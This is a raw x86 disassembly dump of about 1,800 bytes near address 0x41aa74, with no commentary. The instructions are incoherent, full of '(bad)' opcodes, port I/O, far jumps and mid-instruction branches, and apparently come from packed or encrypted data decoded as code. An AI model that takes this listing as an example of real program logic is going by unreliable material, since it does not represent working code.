  41aa74:	fcomp  QWORD PTR [edx]
  41aa76:	mov    eax,0xeb881c90
  41aa7b:	cmp    ah,BYTE PTR [esi-0x3808f13b]
  41aa81:	xor    BYTE PTR [ecx+eax*4+0x2c],dl
  41aa85:	sub    al,0x72
  41aa87:	push   edx
  41aa88:	xchg   esi,eax
  41aa89:	fmul   QWORD PTR [ebp-0x25]
  41aa8c:	cwde   
  41aa8d:	mov    DWORD PTR ds:0x87c63c92,esi
  41aa93:	jo     0x41aa97
  41aa95:	test   DWORD PTR [eax],edi
  41aa97:	cmp    al,0xed
  41aa99:	lahf   
  41aa9a:	xchg   DWORD PTR [ebp-0x745c5f2],ebx
  41aaa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aaa1:	and    bh,BYTE PTR [edi+0x40]
  41aaa4:	xchg   ebp,eax
  41aaa5:	sbb    esp,DWORD PTR [edx+0x9bdfb21]
  41aaab:	sbb    ebx,edx
  41aaad:	sub    BYTE PTR [edi+0x1],al
  41aab0:	push   ecx
  41aab1:	mov    eax,0xb75a2c3a
  41aab6:	xchg   DWORD PTR [edi],eax
  41aab8:	jg     0x41aa61
  41aaba:	ror    DWORD PTR [esi+eiz*1],0x68
  41aabe:	rcl    DWORD PTR [esp+edi*1+0xe],1
  41aac2:	mov    ds:0x544d601c,al
  41aac7:	mov    bh,0x74
  41aac9:	fsubrp st(5),st
  41aacb:	outs   dx,DWORD PTR ds:[esi]
  41aacc:	push   edi
  41aacd:	jne    0x41ab4a
  41aacf:	aas    
  41aad0:	add    DWORD PTR [ecx+0x17da2dc9],esp
  41aad6:	ficom  DWORD PTR [ebp+0xb]
  41aad9:	es daa 
  41aadb:	push   0xf2b5e47f
  41aae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aae1:	idiv   DWORD PTR [ebx-0x81cf78]
  41aae7:	ja     0x41aac9
  41aae9:	hlt    
  41aaea:	mov    BYTE PTR [ecx+0x1d67ba75],bh
  41aaf0:	icebp  
  41aaf1:	mov    ds:0x47e7e5f3,eax
  41aaf6:	fwait
  41aaf7:	mov    ebx,0x5922b1f6
  41aafc:	addr16 (bad) 
  41aafe:	mov    ebx,DWORD PTR [ebp+0x81d445d]
  41ab04:	outs   dx,BYTE PTR ds:[esi]
  41ab05:	adc    DWORD PTR [edx],edx
  41ab07:	mov    edx,DWORD PTR [esi+0x57]
  41ab0a:	(bad)  
  41ab0b:	shl    esp,cl
  41ab0d:	mov    esi,0xadbcace
  41ab12:	pop    ds
  41ab13:	add    BYTE PTR [ecx+0x260b7929],cl
  41ab19:	mov    ds:0xea94a7a8,al
  41ab1e:	push   edi
  41ab1f:	xlat   BYTE PTR ds:[ebx]
  41ab20:	mov    ds:0xf2a1cd6,eax
  41ab25:	ds in  eax,dx
  41ab27:	xlat   BYTE PTR ds:[ebx]
  41ab28:	mov    esp,0x4c90a95c
  41ab2d:	pop    eax
  41ab2e:	jno    0x41ab78
  41ab30:	test   al,0xbe
  41ab32:	ret    
  41ab33:	xchg   DWORD PTR [esi-0x50],edi
  41ab36:	mov    edi,0x66285164
  41ab3b:	loop   0x41aacc
  41ab3d:	nop
  41ab3e:	out    dx,eax
  41ab3f:	nop
  41ab40:	mov    ah,0x49
  41ab42:	mul    edi
  41ab44:	pop    ebx
  41ab45:	daa    
  41ab46:	add    DWORD PTR [edi+0x7c],ebx
  41ab49:	push   ds
  41ab4a:	or     ebp,ebx
  41ab4c:	cmc    
  41ab4d:	scas   eax,DWORD PTR es:[edi]
  41ab4e:	mov    edx,DWORD PTR [ebx]
  41ab50:	mov    ds:0x29c36170,eax
  41ab55:	adc    dl,BYTE PTR ds:0x9389da39
  41ab5b:	fsubr  QWORD PTR [edi]
  41ab5d:	mov    BYTE PTR [eax],dl
  41ab5f:	push   ebx
  41ab60:	rol    edi,0xa7
  41ab63:	xor    dh,cl
  41ab65:	push   eax
  41ab66:	pop    edi
  41ab67:	pop    esi
  41ab68:	xchg   esp,eax
  41ab69:	jl     0x41ab13
  41ab6b:	cmp    eax,0xbf934d3d
  41ab70:	jb     0x41ab9c
  41ab72:	sub    ch,BYTE PTR [ebp+0x2f]
  41ab75:	lods   al,BYTE PTR ds:[esi]
  41ab76:	mov    dl,0xab
  41ab78:	mov    ah,0xa7
  41ab7a:	adc    esp,0xffffffb8
  41ab7d:	push   ebx
  41ab7e:	add    ch,ah
  41ab80:	ins    DWORD PTR es:[edi],dx
  41ab81:	or     eax,0x30a1c524
  41ab86:	jg     0x41ab85
  41ab88:	cmp    esp,DWORD PTR [ecx]
  41ab8a:	mov    ds:0x4c35c3,eax
  41ab8f:	mov    ebx,0x5d0a1b43
  41ab94:	leave  
  41ab95:	iret   
  41ab96:	jmp    0xd036:0x84361892
  41ab9d:	push   ebp
  41ab9e:	call   0x4ccb:0x4b52a7fc
  41aba5:	mov    al,ds:0x426b81b1
  41abaa:	in     al,dx
  41abab:	add    eax,0x5eb6f2b5
  41abb0:	or     edi,edi
  41abb2:	(bad)  
  41abb3:	es loop 0x41ac25
  41abb6:	push   esi
  41abb7:	add    eax,0xdf61a29b
  41abbc:	mov    ds:0xeb9911c0,al
  41abc1:	test   eax,0xcc4eb5c5
  41abc6:	aas    
  41abc7:	ds dec esp
  41abc9:	adc    eax,0x570f6554
  41abce:	aas    
  41abcf:	mov    bl,0xb3
  41abd1:	aad    0x93
  41abd3:	xchg   esi,eax
  41abd4:	xor    ah,BYTE PTR [ebx-0x8]
  41abd7:	into   
  41abd8:	stc    
  41abd9:	and    eax,0x20af9826
  41abde:	pop    ss
  41abdf:	test   DWORD PTR [ebp-0x4c2344c6],ebx
  41abe5:	lods   al,BYTE PTR ds:[esi]
  41abe6:	out    0x98,al
  41abe8:	push   ebx
  41abe9:	add    edx,DWORD PTR [eax-0x22aa0127]
  41abef:	xchg   esi,eax
  41abf0:	fmul   QWORD PTR [edx+0x72b84032]
  41abf6:	cmc    
  41abf7:	inc    esp
  41abf8:	inc    esi
  41abf9:	test   eax,0x4819bdb
  41abfe:	and    DWORD PTR [ecx+0x9],0x5
  41ac02:	xor    DWORD PTR [edi],eax
  41ac04:	inc    edx
  41ac05:	fiadd  WORD PTR [ebx+edx*2-0x70]
  41ac09:	jmp    0x41abb0
  41ac0b:	es sti 
  41ac0d:	int    0xc0
  41ac0f:	fdiv   DWORD PTR [edi]
  41ac11:	dec    edx
  41ac12:	cwde   
  41ac13:	jo     0x41ac6a
  41ac15:	sub    edi,DWORD PTR [edi+0x40]
  41ac18:	mov    ds:0x339c8bb6,al
  41ac1d:	xchg   esi,eax
  41ac1e:	adc    BYTE PTR [edi+0x638b0b96],ah
  41ac24:	xor    al,0x1a
  41ac26:	add    DWORD PTR [edi+0x3bb4ecf4],ebx
  41ac2c:	cwde   
  41ac2d:	(bad)  
  41ac2e:	fimul  DWORD PTR [ecx]
  41ac30:	mov    ch,0xad
  41ac32:	jge    0x41abd8
  41ac34:	and    DWORD PTR [ebp-0x18],eax
  41ac37:	push   eax
  41ac38:	jo     0x41ac76
  41ac3a:	out    dx,eax
  41ac3b:	jmp    0x41ac7c
  41ac3d:	fisub  WORD PTR [ecx]
  41ac3f:	cmp    cl,ch
  41ac41:	jg     0x41abfe
  41ac43:	cmp    al,0xb4
  41ac45:	outs   dx,DWORD PTR ds:[esi]
  41ac46:	aas    
  41ac47:	fwait
  41ac48:	add    eax,0x492fd665
  41ac4d:	lods   eax,DWORD PTR ds:[esi]
  41ac4e:	and    DWORD PTR [ebx+0x70],esp
  41ac51:	scas   al,BYTE PTR es:[edi]
  41ac52:	mov    eax,0x1ad6a8c9
  41ac57:	pop    edi
  41ac58:	inc    edi
  41ac59:	sbb    BYTE PTR [esi+0x684be15a],ah
  41ac5f:	cmp    eax,0x24241f05
  41ac64:	xchg   esp,eax
  41ac65:	mov    ds:0xa1e11ca0,eax
  41ac6a:	pusha  
  41ac6b:	mov    BYTE PTR [ebp+0x58],0x17
  41ac6f:	fwait
  41ac70:	and    eax,0x16119e6f
  41ac75:	mov    al,ds:0xe8040e5f
  41ac7a:	lock inc esp
  41ac7c:	push   esi
  41ac7d:	leave  
  41ac7e:	dec    ebp
  41ac7f:	dec    ebx
  41ac80:	dec    ebp
  41ac81:	sub    al,0xb
  41ac83:	jns    0x41acb8
  41ac85:	jo     0x41aca7
  41ac87:	repz mov esp,0x5de26598
  41ac8d:	pop    es
  41ac8e:	and    BYTE PTR [ebp-0x73],dl
  41ac91:	sbb    ah,BYTE PTR [edx-0x65d38f90]
  41ac97:	adc    eax,esp
  41ac99:	test   BYTE PTR [eax],al
  41ac9b:	imul   ebp,DWORD PTR [ebx+0x4e],0x1f
  41ac9f:	arpl   WORD PTR [esi+0x79ad468e],di
  41aca5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aca6:	shr    ecx,cl
  41aca8:	nop
  41aca9:	sbb    ecx,DWORD PTR [edi]
  41acab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acac:	addr16 inc ebx
  41acae:	push   edx
  41acaf:	cs stc 
  41acb1:	adc    BYTE PTR [ebx],bh
  41acb3:	jmp    0x41ac89
  41acb5:	aam    0xed
  41acb7:	fs addr16 retf 0xe8cd
  41acbc:	outs   dx,DWORD PTR ds:[esi]
  41acbd:	loop   0x41acc1
  41acbf:	xor    al,0xce
  41acc1:	jmp    0x41acf2
  41acc3:	cmp    al,0x30
  41acc5:	das    
  41acc6:	out    0x78,eax
  41acc8:	popa   
  41acc9:	add    DWORD PTR [ebx+0x40],ecx
  41accc:	push   edi
  41accd:	xchg   edx,eax
  41acce:	outs   dx,DWORD PTR ds:[esi]
  41accf:	ss xor eax,0x9ae5eb5d
  41acd5:	dec    ebp
  41acd6:	mov    ds:0x87199c16,eax
  41acdb:	sub    esi,DWORD PTR [esi]
  41acdd:	nop
  41acde:	out    0x21,al
  41ace0:	inc    edx
  41ace1:	outs   dx,DWORD PTR ds:[esi]
  41ace2:	dec    esi
  41ace3:	push   ebx
  41ace4:	scas   al,BYTE PTR es:[edi]
  41ace5:	jmp    0xb861:0x1a8124e2
  41acec:	adc    ecx,edi
  41acee:	std    
  41acef:	rcl    ebx,0x6f
  41acf2:	sub    ebp,DWORD PTR [esp+edi*2+0x69]
  41acf6:	cs jb  0x41ac82
  41acf9:	and    eax,0x6f030b2f
  41acfe:	jb     0x41ac9f
  41ad00:	fist   WORD PTR [edx]
  41ad02:	mov    eax,ds:0xdbf58454
  41ad07:	or     dh,ch
  41ad09:	fcomp  DWORD PTR [ebp+0x6a]
  41ad0c:	xor    eax,0x1b68be9d
  41ad11:	and    eax,0xf28eac33
  41ad16:	call   0x610b:0x19e83cbe
  41ad1d:	loope  0x41acdf
  41ad1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad20:	xor    BYTE PTR [ebx+edi*2+0x54311541],al
  41ad27:	mov    al,0xb6
  41ad29:	mov    cl,0x26
  41ad2b:	lea    ebx,[edx+eiz*8+0x7c0e3fcd]
  41ad32:	div    BYTE PTR [edi+0x3ce78b7a]
  41ad38:	and    eax,0x21cc49ce
  41ad3d:	and    al,0x6e
  41ad3f:	call   0x377e2451
  41ad44:	ror    dh,cl
  41ad46:	mov    ds:0xa42b0954,eax
  41ad4b:	add    DWORD PTR [ebx],eax
  41ad4d:	adc    al,0x34
  41ad4f:	xor    eax,0xa8f555b0
  41ad54:	jne    0x41ad1b
  41ad56:	dec    esp
  41ad57:	jl     0x41adca
  41ad59:	ins    BYTE PTR es:[edi],dx
  41ad5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad5b:	mov    WORD PTR [edx],?
  41ad5d:	dec    ecx
  41ad5e:	sahf   
  41ad5f:	push   cs
  41ad60:	add    al,0x83
  41ad62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad63:	jnp    0x41add0
  41ad65:	jp     0x41adc0
  41ad67:	mov    cl,0x9e
  41ad69:	dec    esi
  41ad6a:	jl     0x41ad83
  41ad6c:	fsub   QWORD PTR [edi-0x2b]
  41ad6f:	pop    ss
  41ad70:	iret   
  41ad71:	inc    edi
  41ad72:	pop    edx
  41ad73:	stc    
  41ad74:	adc    dl,ch
  41ad76:	add    BYTE PTR [esi],ch
  41ad78:	inc    ecx
  41ad79:	sar    BYTE PTR [ecx-0x56],1
  41ad7c:	sar    BYTE PTR [eax],1
  41ad7e:	add    al,0x4a
  41ad80:	lods   al,BYTE PTR gs:[esi]
  41ad82:	pop    ebp
  41ad83:	fistp  WORD PTR [ecx]
  41ad85:	dec    esp
  41ad86:	ja     0x41ad6f
  41ad88:	out    dx,eax
  41ad89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad8a:	add    BYTE PTR [edi+0x14],dh
  41ad8d:	in     al,0xee
  41ad8f:	int3   
  41ad90:	mov    dx,0x38c0
  41ad94:	cli    
  41ad95:	in     eax,dx
  41ad96:	test   BYTE PTR [edi],0xf1
  41ad99:	aaa    
  41ad9a:	pop    ss
  41ad9b:	add    BYTE PTR ds:0xcb23a7c,0x88
  41ada2:	mov    cl,0x3f
  41ada4:	mov    bh,0x94
  41ada6:	xor    DWORD PTR [eax+0x7176f273],esp
  41adac:	ins    DWORD PTR es:[edi],dx
  41adad:	xchg   ebp,eax
  41adae:	pop    ecx
  41adaf:	aad    0xbc
  41adb1:	(bad)  
  41adb2:	cmp    BYTE PTR [esi+ebp*8-0x24],ah
  41adb6:	or     dl,dh
  41adb8:	jle    0x41ad65
  41adba:	and    cl,cl
  41adbc:	xchg   esp,eax
  41adbd:	mov    ds:0xa419b459,al
  41adc2:	dec    ebx
  41adc3:	push   ss
  41adc4:	xchg   edx,eax
  41adc5:	sub    dl,ch
  41adc7:	les    ebp,FWORD PTR [ecx+edi*4]
  41adca:	adc    cl,BYTE PTR [esi]
  41adcc:	inc    edi
  41adcd:	scas   eax,DWORD PTR es:[edi]
  41adce:	call   0x1d07:0x8ed77862
  41add5:	scas   eax,DWORD PTR es:[edi]
  41add6:	out    dx,al
  41add7:	sub    bh,BYTE PTR [esi]
  41add9:	lahf   
  41adda:	js     0x41adb1
  41addc:	adc    BYTE PTR [edx+0x74],0xe5
  41ade0:	jnp    0x41add0
  41ade2:	retf   0xc6db
  41ade5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ade6:	xor    bl,BYTE PTR [ecx+0x6ee1b13c]
  41adec:	sbb    BYTE PTR ds:0xff7c99a9,al
  41adf2:	pop    esp
  41adf3:	mov    cl,0xb
  41adf5:	xor    al,0xc1
  41adf7:	hlt    
  41adf8:	test   DWORD PTR [eax-0x6c],esp
  41adfb:	cmp    edx,esi
  41adfd:	lock and BYTE PTR ds:0x3797a925,al
  41ae04:	ret    0x145a
  41ae07:	out    dx,al
  41ae08:	lahf   
  41ae09:	fist   WORD PTR [esp+edx*2]
  41ae0c:	pop    esp
  41ae0d:	xor    eax,0xbf3342e6
  41ae12:	xchg   edi,eax
  41ae13:	sub    eax,0x535e8a14
  41ae18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae19:	xor    DWORD PTR [ecx-0x9],esi
  41ae1c:	jg     0x41add3
  41ae1e:	int3   
  41ae1f:	push   esp
  41ae20:	adc    esp,0xb0a82ddb
  41ae26:	mov    al,ds:0xd54d4329
  41ae2b:	jo     0x41ae64
  41ae2d:	int3   
  41ae2e:	xchg   esi,eax
  41ae2f:	in     al,dx
  41ae30:	sti    
  41ae31:	fidivr DWORD PTR [edi+0x189bfb0b]
  41ae37:	mov    DWORD PTR [edx],esp
  41ae39:	jo     0x41ae70
  41ae3b:	and    al,0xc6
  41ae3d:	fwait
  41ae3e:	mov    ds:0xb38d3ef1,eax
  41ae43:	aam    0xf5
  41ae45:	mov    ds:0xf7ab5983,al
  41ae4a:	fimul  DWORD PTR [ecx]
  41ae4c:	jns    0x41aead
  41ae4e:	mov    BYTE PTR [edi+0xb],cl
  41ae51:	cmp    edi,esi
  41ae53:	xlat   BYTE PTR ds:[ebx]
  41ae54:	add    eax,0xa0af01aa
  41ae59:	inc    esp
  41ae5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae5b:	outs   dx,BYTE PTR ds:[esi]
  41ae5c:	sar    BYTE PTR [ebx-0x30],1
  41ae5f:	cmp    DWORD PTR [edx+0x60],ebp
  41ae62:	ud1    eax,ebp
  41ae65:	sbb    DWORD PTR [edx+0x4e],ebp
  41ae68:	cmc    
  41ae69:	jns    0x41aee2
  41ae6b:	push   0xd5558417
  41ae70:	ss xchg edx,eax
  41ae72:	fldcw  WORD PTR [ecx-0x477988bf]
  41ae78:	cmp    ebp,DWORD PTR [ebp+ecx*1+0x5f5c7a87]
  41ae7f:	or     al,0x6f
  41ae81:	pop    ds
  41ae82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae83:	pushw  es
  41ae85:	retf   
  41ae86:	mov    edx,0x1c04e99f
  41ae8b:	jecxz  0x41ae4e
  41ae8d:	jbe    0x41aee8
  41ae8f:	std    
  41ae90:	push   edx
  41ae91:	aas    
  41ae92:	sub    cl,bh
  41ae94:	in     eax,0x83
  41ae96:	dec    ecx
  41ae97:	aas    
  41ae98:	cdq    
  41ae99:	lds    edi,FWORD PTR [ecx]
  41ae9b:	mov    BYTE PTR [esi],dh
  41ae9d:	or     al,0x8c
  41ae9f:	leave  
  41aea0:	sub    ebp,edi
  41aea2:	jecxz  0x41ae2f
  41aea4:	mov    esp,0x23e1329b
  41aea9:	dec    ecx
  41aeaa:	add    bh,BYTE PTR [ebp+0x4f]
  41aead:	sub    ah,BYTE PTR [ecx-0xd56d92d]
  41aeb3:	xor    bl,ah
  41aeb5:	pop    esi
  41aeb6:	icebp  
  41aeb7:	xor    eax,0x7b5bfd51
  41aebc:	stc    
  41aebd:	xor    cl,BYTE PTR [ecx-0xaa6c6fd]
  41aec3:	mov    ds,WORD PTR [eax]
  41aec5:	mov    ecx,0xdfead619
  41aeca:	out    dx,eax
  41aecb:	pop    es
  41aecc:	pop    ebp
  41aecd:	shr    DWORD PTR [ebp-0xd],0x93
  41aed1:	fist   DWORD PTR [esi-0x1b]
  41aed4:	call   0x2f11dae1
  41aed9:	fisubr DWORD PTR [ecx-0x106200bb]
  41aedf:	stc    
  41aee0:	(bad)
  41aee4:	cmp    eax,0xeb14a314
  41aee9:	test   eax,0x51d66246
  41aeee:	dec    ebp
  41aeef:	in     al,dx
  41aef0:	xchg   edx,eax
  41aef1:	xchg   DWORD PTR [edi-0x6d8ac984],edi
  41aef7:	or     eax,0x3a741af2
  41aefc:	in     eax,dx
  41aefd:	adc    edi,DWORD PTR [esi+0x16eed7f]
  41af03:	loopne 0x41ae8f
  41af05:	mov    cl,0x41
  41af07:	add    BYTE PTR [edi],dl
  41af09:	ret    
  41af0a:	es pop ebp
  41af0c:	sbb    al,0x2f
  41af0e:	(bad)  
  41af0f:	into   
  41af10:	mov    ch,0x63
  41af12:	jg     0x41aed5
  41af14:	dec    ecx
  41af15:	fwait
  41af16:	in     eax,0x62
  41af18:	clc    
  41af19:	and    esi,edi
  41af1b:	retf   
  41af1c:	stc    
  41af1d:	pop    edx
  41af1e:	push   0x54
  41af20:	aam    0x1c
  41af22:	sub    eax,0x616a4787
  41af27:	pop    eax
  41af28:	add    al,0x7c
  41af2a:	popa   
  41af2b:	cdq    
  41af2c:	adc    eax,0xe848b097
  41af31:	je     0x41af88
  41af33:	inc    ebx
  41af34:	mov    edi,gs
  41af36:	shl    BYTE PTR [eax+0x19b84932],1
  41af3c:	jo     0x41af81
  41af3e:	ins    DWORD PTR es:[edi],dx
  41af3f:	sbb    BYTE PTR [edx],ch
  41af41:	dec    esp
  41af42:	add    al,0xae
  41af44:	inc    ebx
  41af45:	mov    ds:0x8fe92369,eax
  41af4a:	sub    BYTE PTR [esi+0x12],bl
  41af4d:	(bad)  [esi+0xa]
  41af50:	inc    ebx
  41af51:	pop    ebp
  41af52:	push   edi
  41af53:	das    
  41af54:	xchg   esp,eax
  41af55:	test   BYTE PTR [eax+0x4c],al
  41af58:	push   ss
  41af59:	cmp    esi,DWORD PTR [ecx+esi*4-0x61]
  41af5d:	sub    al,0xed
  41af5f:	mov    eax,0xa3dbaf3d
  41af64:	test   al,0x2a
  41af66:	dec    edi
  41af67:	mov    eax,0x34e20f
  41af6c:	mov    ebp,0x936b794d
  41af71:	fnstsw WORD PTR [edx+0x3]
  41af74:	dec    edi
  41af75:	dec    esp
  41af76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af77:	clc    
  41af78:	jmp    0x41af50
  41af7a:	pop    edx
  41af7b:	cmc    
  41af7c:	inc    edx
  41af7d:	lea    ebx,[edi+0x49f6e980]
  41af83:	in     eax,0x9e
  41af85:	cmp    edx,DWORD PTR [edx+0x468f913e]
  41af8b:	fs mov eax,0x8b74b108
  41af91:	push   ebx
  41af92:	adc    al,0xc
  41af94:	aam    0x76
  41af96:	mov    ah,BYTE PTR [ebp-0x378fd60]
  41af9c:	iret   
  41af9d:	rcr    BYTE PTR [edx+0x2],1
  41afa0:	xchg   ecx,eax
  41afa1:	pusha  
  41afa2:	sub    DWORD PTR [ebp-0x36],edx
  41afa5:	cli    
  41afa6:	rcl    DWORD PTR [eax+0x5e],0x77
  41afaa:	(bad)
  41afad:	iret   
  41afae:	retf   
  41afaf:	stc    
  41afb0:	mov    eax,ds
  41afb2:	pop    edi
  41afb3:	ds cmc 
  41afb5:	mov    eax,0x9eceef48
  41afba:	sub    BYTE PTR [edi+0x69a01c92],ah
  41afc0:	jmp    0xfc3da55e
  41afc5:	into   
  41afc6:	ja     0x41afea
  41afc8:	ftst   
  41afca:	xchg   edi,eax
  41afcb:	arpl   WORD PTR [ebp-0x28],bp
  41afce:	sar    BYTE PTR [ecx+0x6efb6bc8],0x99
  41afd5:	pop    ecx
  41afd6:	or     eax,0x71002926
  41afdb:	add    al,bl
  41afdd:	bound  ebp,QWORD PTR [ebp-0x64]
  41afe0:	jne    0x41affa
  41afe2:	pushf  
  41afe3:	call   DWORD PTR [esi-0x46c00313]
  41afe9:	push   ss
  41afea:	jg     0x41afb8
  41afec:	or     BYTE PTR [ebp-0x7d0f6a89],bl
  41aff2:	xor    DWORD PTR [ecx+0x53],ecx
  41aff5:	hlt    
  41aff6:	push   ss
  41aff7:	das    
  41aff8:	test   al,0xc4
  41affa:	push   0xc7a09dfe
  41afff:	push   ss
  41b000:	scas   eax,DWORD PTR es:[edi]
  41b001:	sbb    eax,DWORD PTR [edi+esi*2-0x573a23b4]
  41b008:	xchg   ebx,eax
  41b009:	mov    ecx,0xf7e5dc3d
  41b00e:	ficomp DWORD PTR [ecx+0x2c]
  41b011:	lds    ebx,FWORD PTR [esi+eiz*8]
  41b014:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b015:	fst    QWORD PTR [ebp-0x11]
  41b018:	(bad)  
  41b019:	fist   WORD PTR [ebp+edi*2-0x26b553dc]
  41b020:	jnp    0x41b036
  41b022:	dec    esi
  41b023:	push   ds
  41b024:	jae    0x41b020
  41b026:	ret    0x7c34
  41b029:	push   edi
  41b02a:	xchg   ebx,eax
  41b02b:	inc    ebx
  41b02c:	push   0xe0a1e233
  41b031:	inc    ecx
  41b032:	es ja  0x41b02e
  41b035:	jns    0x41b044
  41b037:	loope  0x41aff8
  41b039:	adc    esp,DWORD PTR [ebp+0x37956433]
  41b03f:	scas   eax,DWORD PTR es:[edi]
  41b040:	ds out 0xf9,eax
  41b043:	outs   dx,BYTE PTR ds:[esi]
  41b044:	jmp    0xd1df3358
  41b049:	mov    ah,0x51
  41b04b:	sbb    BYTE PTR [ebx-0xf2eed57],bl
  41b051:	imul   esi,DWORD PTR [esp-0x49],0xe9bcfa22
  41b059:	mov    esi,0x97209dd9
  41b05e:	inc    ebp
  41b05f:	(bad)  
  41b060:	ficom  DWORD PTR [ebx-0x457e1211]
  41b066:	push   0xbad87c8b
  41b06b:	mov    BYTE PTR [edx],bh
  41b06d:	test   al,0x27
  41b06f:	and    eax,0x889d7161
  41b074:	pop    DWORD PTR [ecx+ebp*2]
  41b077:	adc    BYTE PTR [ebx],0x8c
  41b07a:	mov    ebx,0xea969e5d
  41b07f:	push   0xffffffc2
  41b081:	mov    al,0xc1
  41b083:	or     eax,0x5cb824f5
  41b088:	(bad)  
  41b089:	ins    DWORD PTR es:[edi],dx
  41b08a:	and    al,0x27
  41b08c:	xchg   ecx,eax
  41b08d:	and    dl,BYTE PTR [edi-0xbce5751]
  41b093:	jecxz  0x41b08b
  41b095:	popf   
  41b096:	jne    0x41b05c
  41b098:	jne    0x41b0b1
  41b09a:	mov    ch,0x75
  41b09c:	sahf   
  41b09d:	aad    0xbf
  41b09f:	xchg   ebx,eax
  41b0a0:	imul   edx,DWORD PTR [edi+0x2d],0x53
  41b0a4:	in     al,0xde
  41b0a6:	jmp    0x76246a88
  41b0ab:	xchg   esp,eax
  41b0ac:	addr16 mov esi,0x91c8e26b
  41b0b2:	ins    BYTE PTR es:[edi],dx
  41b0b3:	mov    ebx,0xd1e58f5d
  41b0b8:	rol    BYTE PTR [esi+0x29105330],1
  41b0be:	pop    esi
  41b0bf:	sub    eax,DWORD PTR [ecx+0x5e978248]
  41b0c5:	imul   DWORD PTR [esi]
  41b0c7:	sahf   
  41b0c8:	cmp    eax,0x9ad448a1
  41b0cd:	stc    
  41b0ce:	les    esi,FWORD PTR [edx-0x5b]
  41b0d1:	bound  esi,QWORD PTR [ebx+0x74]
  41b0d4:	mov    ah,0x97
  41b0d6:	int3   
  41b0d7:	cld    
  41b0d8:	pop    edi
  41b0d9:	lock call 0x9b189659
  41b0df:	cmp    BYTE PTR [edx],0xaf
  41b0e2:	mov    ebx,0xac6df60e
  41b0e7:	fs gs call 0xe709:0xc9a228cd
  41b0f0:	sbb    al,dl
  41b0f2:	leave  
  41b0f3:	add    BYTE PTR [ecx+0x7b5cb94c],bl
  41b0f9:	jmp    0x41b0b7
  41b0fb:	mov    DWORD PTR [edx+ebx*2],esi
  41b0fe:	pop    edi
  41b0ff:	and    BYTE PTR [esi+edx*8-0x5f3dd86f],ah
  41b106:	pop    esp
  41b107:	loope  0x41b168
  41b109:	inc    edx
  41b10a:	loop   0x41b139
  41b10c:	cmp    eax,0x5032c3ad
  41b111:	mov    esp,0x80197575
  41b116:	ss (bad) 
  41b118:	cmc    
  41b119:	je     0x41b160
  41b11b:	test   ecx,esp
  41b11d:	or     al,0x26
  41b11f:	adc    eax,eax
  41b121:	(bad)  
  41b123:	in     eax,dx
  41b124:	ror    esi,0x80
  41b127:	push   eax
  41b128:	inc    ecx
  41b129:	jnp    0x41b102
  41b12b:	push   ss
  41b12c:	mov    edx,0x3991a9e7
  41b131:	jmp    0x1a302d26
  41b136:	jmp    0x24becfce
  41b13b:	cld    
  41b13c:	mov    ebx,ebx
  41b13e:	push   0x5b
  41b140:	sub    ebp,ebx
  41b142:	fistp  WORD PTR [ebp+eiz*4+0x1061fdd4]
  41b149:	aaa    
  41b14a:	xchg   ecx,eax
  41b14b:	and    eax,0x4d7f0dfa
  41b150:	or     BYTE PTR [edx-0x3314a577],dl
  41b156:	ja     0x41b0ff
  41b158:	cmc    
  41b159:	xor    DWORD PTR [ebp-0x3a7670a1],edx
  41b15f:	fadd   st(0),st
  41b161:	add    bl,BYTE PTR [ecx]
  41b163:	enter  0x768d,0xd2
  41b167:	xor    esi,ecx
  41b169:	outs   dx,BYTE PTR es:[esi]
  41b16b:	push   ecx
  41b16c:	or     ah,dl
  41b16e:	xor    DWORD PTR [esi-0xf],esi
  41b171:	xor    dl,BYTE PTR [esi+0x6afeb37f]
  41b177:	aad    0x89
  41b179:	rol    BYTE PTR [edx+0x10ddea27],0x2d
  41b180:	and    esi,DWORD PTR [ecx-0x31640685]
  41b186:	mov    BYTE PTR ds:0x6920c38f,cl
  41b18c:	mov    bh,BYTE PTR [edx-0x66b9b283]
  41b192:	inc    esp
  41b193:	scas   al,BYTE PTR es:[edi]
  41b194:	inc    edx
  41b195:	push   ds
  41b196:	sub    eax,0x868f8ede
  41b19b:	cmp    esp,DWORD PTR [edi+0x7b]
  41b19e:	cmc    
  41b19f:	mov    eax,ds:0xf32c0d3e
  41b1a4:	add    esp,edi
  41b1a6:	inc    ebx
  41b1a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b1a8:	sbb    edi,edx
  41b1aa:	fsub   DWORD PTR ss:[esp+ebx*2-0x78187c2a]
  41b1b2:	inc    edx
  41b1b3:	sbb    al,0x5f
  41b1b5:	mov    ebp,DWORD PTR [esi]
  41b1b7:	mov    edi,0x35a71717
  41b1bc:	rcr    BYTE PTR [edx+0x1c8d0dd],cl
  41b1c2:	xor    dh,BYTE PTR [ebx+0x3db94b99]
  41b1c8:	iret   
  41b1c9:	popa   
  41b1ca:	cmp    BYTE PTR [edx-0x270bbd29],cl
  41b1d0:	xlat   BYTE PTR ds:[ebx]
  41b1d1:	out    0x94,eax
  41b1d3:	iret   
  41b1d4:	mov    ecx,0xe2a94e93
  41b1d9:	mov    esi,DWORD PTR [eax+0x31a9c1c3]
  41b1df:	lea    edi,[eax]
  41b1e1:	test   al,0xd7
  41b1e3:	js     0x41b25b
  41b1e5:	jns    0x41b175
  41b1e7:	gs jle 0x41b1cb
  41b1ea:	mov    dh,BYTE PTR [ebx]
  41b1ec:	sbb    ch,BYTE PTR [edx-0x2eb3c1a]
  41b1f2:	jo     0x41b1ec
  41b1f4:	mov    al,0xca
  41b1f6:	push   cs
  41b1f7:	sbb    eax,0x16ae4332
  41b1fc:	xchg   BYTE PTR [ebx+0x1553a8f0],al
